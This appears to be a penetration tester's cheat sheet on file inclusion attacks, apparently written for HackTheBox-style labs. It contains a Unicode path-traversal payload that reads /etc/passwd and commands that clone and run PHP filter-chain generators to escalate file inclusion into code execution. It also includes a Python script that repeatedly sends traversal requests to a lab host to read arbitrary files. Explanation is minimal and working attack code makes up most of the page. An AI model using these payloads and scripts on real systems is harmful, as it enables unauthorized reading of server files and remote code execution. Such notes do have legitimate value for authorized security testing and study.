# LFI-RFI

## **Resources**

* <https://0xffsec.com/handbook/web-applications/file-inclusion-and-path-traversal/#at-a-glance>
* <https://www.youtube.com/watch?v=csWTuEdL_KM>

### **Unicode**

```
# u+FE30
︰/︰/︰/︰/︰/︰/︰/etc/passwd
```

## LFI 2 RCE

### PHP Filter Chain

```
git clone https://github.com/synacktiv/php_filter_chain_generator
cd php_filter_chain_generator
python3 php_filter_chain_generator.py --chain '<?php phpinfo(); ?>'
```

### PHP Suffix | Prefix Needed

WrapWrap generates a `php://filter` chain that adds a prefix and a suffix to the contents of a file.

```
git clone https://github.com/ambionics/wrapwrap
cd wrapwrap
# ten is a dependency
git clone https://github.com/cfreal/ten
cd ten
pip3 install .
python3 wrapwrap.py /flag.txt '504e47' '' 1000
```

## LFI-Reader

```
import requests
import readline
from rich.console import Console

cinput = Console()

while True:
    try:
        readline.parse_and_bind("tab: complete")
        readline.write_history_file(".history")
        file = cinput.input("[bold green](File)>> [/bold green]")
        burp0_url = f"http://inject.htb:8080/show_image?img=../../../../../..{file}"
        burp0_headers = {"Upgrade-Insecure-Requests": "1", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.5481.78 Safari/537.36", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7", "Referer": "http://inject.htb:8080/upload", "Accept-Encoding": "gzip, deflate", "Accept-Language": "en-US,en;q=0.9", "Connection": "close"}
        req = requests.get(burp0_url, headers=burp0_headers)
        print(req.text)
    except Exception as e:
        print(e)
```

